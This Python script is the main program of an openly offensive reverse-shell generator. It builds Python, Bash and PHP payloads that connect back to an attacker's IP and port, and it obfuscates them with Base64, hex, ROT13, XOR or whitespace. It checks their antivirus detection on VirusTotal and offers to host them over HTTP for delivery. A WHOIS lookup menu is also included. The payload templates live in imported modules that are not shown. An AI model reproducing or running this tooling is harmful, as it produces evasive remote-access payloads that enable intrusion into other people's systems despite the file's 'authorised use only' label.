#!/usr/bin/env python3
"""
Menu-driven Reverse-Shell Generator
Adds optional encoding (Base64, Hex, ROT13, XOR) and obfuscation for Bash, Python, and PHP payloads.
Authorised use only!
"""

import os
import argparse
from payloads import python, bash, php
from encoders.encoder import (
    B64_WRAPPERS, HEX_WRAPPERS, ROT13_WRAPPERS, XOR_WRAPPERS, OBFUSCATOR_WRAPPERS
)
from host_payload import serve_directory
from colorama import init, Fore, Style
from utils.input_validation import get_lhost, get_lport, is_valid_ip, is_valid_hostname, is_valid_port
from utils.vt_report import upload_file_to_virustotal, get_vt_report

# --- WHOIS IMPORTS ---
from utils.whois_utils import (
    is_valid_ip as whois_valid_ip,
    is_valid_domain,
    whois_domain,
    whois_ip,
    generate_whois_html,
    prompt_for_domains_or_ips  # <-- NEW import
)

init(autoreset=True)

PAYLOAD_MAP = {
    "1": ("python",  python.generate,  "reverse_shell.py"),
    "2": ("bash",    bash.generate,    "reverse_shell.sh"),
    "3": ("php",     php.generate,     "reverse_shell.php"),
}

def print_banner():
    print(Fore.RED + Style.BRIGHT + "\n╔" + "═"*64 + "╗")
    ascii_art = [
        "██████╗ ███████╗██╗   ██╗███████╗██████╗ ██╗    ██╗██╗  ██╗",
        "██╔══██╗██╔════╝██║   ██║██╔════╝██╔══██╗██║    ██║╚██╗██╔╝",
        "██████╔╝█████╗  ██║   ██║█████╗  ██████╔╝██║ █╗ ██║ ╚███╔╝ ",
        "██╔═══╝ ██╔══╝  ╚██╗ ██╔╝██╔══╝  ██╔══██╗██║███╗██║ ██╔██╗ ",
        "██║     ███████╗ ╚████╔╝ ███████╗██║  ██║╚███╔███╔╝██╔╝ ██╗",
        "╚═╝     ╚══════╝  ╚═══╝  ╚══════╝╚═╝  ╚═╝ ╚══╝╚══╝ ╚═╝  ╚═╝"
    ]
    for line in ascii_art:
        print(Fore.RED + Style.BRIGHT + "║{:^64s}║".format(line))
    print(Fore.RED + Style.BRIGHT + "╠" + "═"*64 + "╣")
    print(Fore.WHITE + Style.BRIGHT + "║{:^64s}║".format("Reverse-shell Generator"))
    print(Fore.WHITE + "║{:^64s}║".format("Author: Praveen Magar"))
    print(Fore.RED + Style.BRIGHT + "╚" + "═"*64 + "╝" + Style.RESET_ALL)

def save_payload(code: str, filename: str) -> None:
    os.makedirs("output", exist_ok=True)
    with open(f"output/{filename}", "w") as f:
        f.write(code)
    print(Fore.GREEN + f"[+] Payload saved as output/{filename}")

def whois_lookup_menu():
    print(Fore.CYAN + "\n=== WHOIS Lookup Utility ===" + Style.RESET_ALL)
    # --- Use robust input/validation from whois_utils.py ---
    valid_domains, valid_ips = prompt_for_domains_or_ips()  # <--- RECOMMENDED!

    domain_results = [whois_domain(d) for d in valid_domains]
    ip_results = [whois_ip(ip) for ip in valid_ips]

    # Terminal pretty print (optional, using tabulate if you wish)
    try:
        from tabulate import tabulate
        if domain_results:
            print(Fore.CYAN + "\n[Domain WHOIS Results]" + Style.RESET_ALL)
            domain_table = []
            for r in domain_results:
                if "error" in r:
                    domain_table.append([r['domain'], "ERROR: " + r['error'], "", "", "", "", ""])
                else:
                    domain_table.append([
                        r.get('domain',''),
                        r.get('registrar',''),
                        r.get('org',''),
                        r.get('country',''),
                        r.get('creation_date',''),
                        r.get('expiration_date',''),
                        r.get('emails','')
                    ])
            headers = ["Domain", "Registrar", "Org", "Country", "Creation", "Expiry", "Email"]
            print(tabulate(domain_table, headers=headers, tablefmt="fancy_grid"))

        if ip_results:
            print(Fore.CYAN + "\n[IP WHOIS Results]" + Style.RESET_ALL)
            ip_table = []
            for r in ip_results:
                if "error" in r:
                    ip_table.append([r['ip'], "ERROR: " + r['error'], "", "", ""])
                else:
                    ip_table.append([
                        r.get('ip',''),
                        r.get('asn',''),
                        r.get('org',''),
                        r.get('country',''),
                        r.get('cidr','')
                    ])
            headers = ["IP", "ASN", "Org", "Country", "CIDR"]
            print(tabulate(ip_table, headers=headers, tablefmt="fancy_grid"))
    except ImportError:
        print(Fore.YELLOW + "Tip: Install tabulate for pretty terminal tables: pip install tabulate" + Style.RESET_ALL)

    # ---- Ask user for filename before saving ----
    default_name = "whois_lookup.html"
    custom_name = input(Fore.YELLOW + f"Enter filename to save WHOIS HTML report (default: {default_name}): " + Style.RESET_ALL).strip()
    output_filename = custom_name if custom_name else default_name
    if not output_filename.endswith('.html'):
        output_filename += '.html'
    output_file = os.path.join("output/reports", output_filename)
    os.makedirs(os.path.dirname(output_file), exist_ok=True)

    html_snippet = generate_whois_html(domain_results, ip_results)
    with open(output_file, "w", encoding="utf-8") as f:
        f.write(html_snippet)
    print(Fore.GREEN + f"\n[+] WHOIS HTML report saved: {output_file}\nOpen it in your browser!" + Style.RESET_ALL)

def main():
    print_banner()
    # --- Main Menu ---
    print(Fore.CYAN + "\nSelect option:")
    print(Fore.CYAN + " 1. Generate reverse shell payload")
    print(Fore.CYAN + " 2. WHOIS Lookup utility")
    option = input(Fore.YELLOW + "Enter choice (1/2): " + Style.RESET_ALL).strip()

    if option == "2":
        whois_lookup_menu()
        return

    # --- Option 1: Generate payload (existing logic) ---
    parser = argparse.ArgumentParser(
        description="Reverse-shell generator with encoding and obfuscation options."
    )
    parser.add_argument("--ip", help="Attacker IP (LHOST)")
    parser.add_argument("--port", help="Listener port (LPORT)")
    parser.add_argument("--payload", choices=["python", "bash", "php"], help="Payload type")
    parser.add_argument("--encoder", choices=["none", "base64", "hex", "rot13", "xor", "obf"], help="Encoding/Obfuscator type")
    parser.add_argument("--output", help="Output filename")
    args = parser.parse_args()

    # === INPUT VALIDATION ADDED HERE ===
    # Validate LHOST
    if args.ip and (is_valid_ip(args.ip) or is_valid_hostname(args.ip)):
        ip = args.ip
    else:
        ip = get_lhost()

    # Validate LPORT
    if args.port and is_valid_port(args.port):
        port = args.port
    else:
        port = get_lport()

    if args.payload:
        payload_choice = {"python": "1", "bash": "2", "php": "3"}[args.payload]
    else:
        print(Fore.CYAN + "\nSelect payload type:")
        print(Fore.CYAN + " 1. Python")
        print(Fore.CYAN + " 2. Bash")
        print(Fore.CYAN + " 3. PHP")
        payload_choice = input(Fore.YELLOW + "Enter choice (1/2/3): " + Style.RESET_ALL).strip()

    if payload_choice not in PAYLOAD_MAP:
        print(Fore.RED + "[-] Invalid choice!")
        return

    lang, gen_fn, default_name = PAYLOAD_MAP[payload_choice]
    raw_code = gen_fn(ip, port)

    # Encoder logic
    encoder_map = {
        "none": ("", lambda code: code),
        "base64": (".b64", lambda code: B64_WRAPPERS[lang](code)),
        "hex": (".hex", lambda code: HEX_WRAPPERS["python"](code) if lang == "python" else code),
        "rot13": (".rot13", lambda code: ROT13_WRAPPERS["python"](code) if lang == "python" else code),
        "xor": (".xor", lambda code: XOR_WRAPPERS["python"](code) if lang == "python" else code),
        "obf": (".obf", lambda code: OBFUSCATOR_WRAPPERS["python"](code) if lang == "python" else code)
    }

    if args.encoder:
        enc = args.encoder
        if enc not in encoder_map:
            print(Fore.RED + "[-] Encoder not supported.")
            return
        enc_ext, encoder_fn = encoder_map[enc]
        if lang != "python" and enc not in ["none", "base64"]:
            print(Fore.RED + f"[-] {enc} encoding only supported for Python.")
            return
        final_code = encoder_fn(raw_code)
    else:
        # Interactive encoder selection
        print(Fore.CYAN + "\nSelect encoder or obfuscator:")
        print(Fore.CYAN + " 1. None")
        print(Fore.CYAN + " 2. Base64")
        if lang == "python":
            print(Fore.CYAN + " 3. Hex")
            print(Fore.CYAN + " 4. ROT13")
            print(Fore.CYAN + " 5. XOR (key=23)")
            print(Fore.CYAN + " 6. Obfuscate with whitespace/comments")
        encoder_choice = input(Fore.YELLOW + "Enter choice: " + Style.RESET_ALL).strip()

        if encoder_choice == "1":
            final_code = raw_code
            enc_ext = ""
        elif encoder_choice == "2":
            final_code = B64_WRAPPERS[lang](raw_code)
            enc_ext = ".b64"
        elif encoder_choice == "3" and lang == "python":
            final_code = HEX_WRAPPERS["python"](raw_code)
            enc_ext = ".hex"
        elif encoder_choice == "4" and lang == "python":
            final_code = ROT13_WRAPPERS["python"](raw_code)
            enc_ext = ".rot13"
        elif encoder_choice == "5" and lang == "python":
            final_code = XOR_WRAPPERS["python"](raw_code)
            enc_ext = ".xor"
        elif encoder_choice == "6" and lang == "python":
            final_code = OBFUSCATOR_WRAPPERS["python"](raw_code)
            enc_ext = ".obf"
        else:
            print(Fore.RED + "[-] Encoder not supported for this payload type.")
            return

    # Output filename
    fname = args.output or input(Fore.YELLOW + f"Save as (default: {default_name}{enc_ext}): " + Style.RESET_ALL).strip() or (default_name + enc_ext)
    save_payload(final_code, fname)

    # === Print summary and VirusTotal scan integration starts here ===
    print(Fore.MAGENTA + Style.BRIGHT + "\n=== PAYLOAD SUMMARY ===" + Style.RESET_ALL)
    print(Fore.CYAN + f"Type      : {lang}")
    print(Fore.CYAN + f"Encoder   : {args.encoder if args.encoder else 'interactive'}")
    print(Fore.CYAN + f"LHOST     : {ip}")
    print(Fore.CYAN + f"LPORT     : {port}")
    print(Fore.CYAN + f"File      : {fname}")

    # Offer to scan with VirusTotal
    scan = input("Do you want to check this payload's AV detection rate on VirusTotal? (y/n): ").strip().lower()
    if scan == "y":
        api_key = input("Enter your VirusTotal API key: ").strip()
        file_path = os.path.join("output", fname)
        file_id = upload_file_to_virustotal(file_path, api_key)
        if file_id:
            get_vt_report(file_id, api_key, file_path=file_path)

    # Offer to host the payload via HTTP (using imported function)
    host = input(Fore.YELLOW + "\nDo you want to host the payload in the 'output' folder via HTTP? (y/n): " + Style.RESET_ALL).strip().lower()
    if host == "y":
        port_input = input(Fore.YELLOW + "Enter port to use for hosting (default 8080): " + Style.RESET_ALL).strip()
        port = int(port_input) if port_input else 8080
        serve_directory("output", port)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(Fore.RED + "\n[!] Interrupted by user.")
